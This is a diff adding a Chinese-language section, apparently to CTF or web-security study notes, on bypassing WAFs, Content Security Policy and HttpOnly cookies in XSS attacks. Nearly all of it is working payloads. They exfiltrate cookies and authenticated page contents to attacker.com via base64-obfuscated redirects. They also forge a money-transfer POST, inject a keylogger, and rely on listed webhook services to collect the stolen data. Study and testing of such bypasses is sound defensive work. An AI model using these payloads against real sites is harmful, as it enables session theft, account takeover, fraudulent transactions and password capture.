@@ -422,6 +422,79 @@ fetch(`/getflag\)
 
   </details>
 
+- WAF / CSP / HttpOnly 繞過技巧
+
+  <details markdown="1">
+  <summary><span class="spoiler">WAF / CSP / HttpOnly 繞過技巧（實戰整理）</span></summary>
+
+  ##### WAF 繞過
+
+  ```js
+  // WAF 擋 alert() → 改用 print() 或 confirm() 確認 XSS 觸發
+  <img src=x onerror="print()">
+  <img src=x onerror="confirm(1)">
+
+  // WAF 擋 event handler 中的 URL → 用 atob() 解碼 base64 繞過
+  // echo -n "https://attacker.com/?s=" | base64
+  <img src=x onerror="top.location=atob(`aHR0cHM6Ly9hdHRhY2tlci5jb20vP3M9`)+document.cookie">
+
+  // 後端把單引號 ' 轉成 '' (SQL-style escaping) → 改用反引號 ` (template literal)
+  <img src=x onerror="top.location=atob(`base64payload`)+`test`">
+
+  // 雙引號在 split 等操作中需要 → 用 \x22 代替
+  t.split(`sessionId`)[1].split(`\x22`)[1]
+  ```
+
+  ##### CSP 繞過
+
+  ```js
+  // CSP default-src 'self' 擋 img-src / connect-src 到外部
+  // 但 CSP 無法阻擋 navigation，所以用 top.location 跳轉外帶資料
+  <img src=x onerror="top.location=`https://attacker.com/?d=`+document.cookie">
+
+  // XSS 在 iframe 裡時，location= 只導航 iframe 本身
+  // frame-src 'self' 會擋，改用 top.location= (同源 iframe 可導航 top)
+  <img src=x onerror="top.location=`https://attacker.com/?d=`+document.cookie">
+
+  // CSP connect-src 'self' → 同源 fetch 不受限，可讀取認證後頁面再外帶
+  <img src=x onerror="fetch(`/admin/settings`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?d=`+encodeURIComponent(t.substring(0,500))})">
+  ```
+
+  ##### HttpOnly Cookie 繞過
+
+  ```js
+  // HttpOnly 擋 document.cookie 讀取 session cookie
+  // 策略 1: 找其他頁面 HTML/JS 中洩漏的 session 變數，用同源 fetch 讀取
+  <img src=x onerror="fetch(`/page-with-session-var`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?s=`+t.split(`sessionId`)[1].split(`\x22`)[1]})">
+
+  // 策略 2: 不偷 session，直接以受害者身份執行操作（同源 request 自動帶 cookie）
+  <img src=x onerror="fetch(`/api/transfer`,{method:`POST`,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`to=attacker&amount=9999`})">
+
+  // 策略 3: 抓取敏感頁面資料外帶
+  <img src=x onerror="fetch(`/account/info`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?d=`+encodeURIComponent(t.substring(0,800))})">
+
+  // 策略 4: 注入 keylogger 偷密碼
+  <img src=x onerror="top.document.onkeypress=function(e){new Image().src=`https://attacker.com/?k=`+e.key}">
+  ```
+
+  ##### Debug 技巧
+
+  ```js
+  // 加 .catch() 避免 payload 靜默失敗，錯誤也送到外部
+  <img src=x onerror="fetch(`/target`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?s=`+t.length}).catch(e=>{top.location=`https://attacker.com/?err=`+e})">
+
+  // 開發順序: 先送回應長度確認 fetch → 再送內容片段確認 parse → 最後組完整 payload
+  ```
+
+  ##### 常用外帶 webhook
+
+  - [Beeceptor](https://beeceptor.com/) — 免費、即時查看 request
+  - [Webhook.site](https://webhook.site/) — 免費、支援自訂回應
+  - [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) — 整合 Burp，支援 DNS/HTTP/SMTP
+  - [Ngrok](https://ngrok.com/) — 本地開 server 對外
+
+  </details>
+
 #### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)
 
 - 先確認是不是真的有這個問題: {% raw %}`{{7*7}}`{% endraw %} → 49
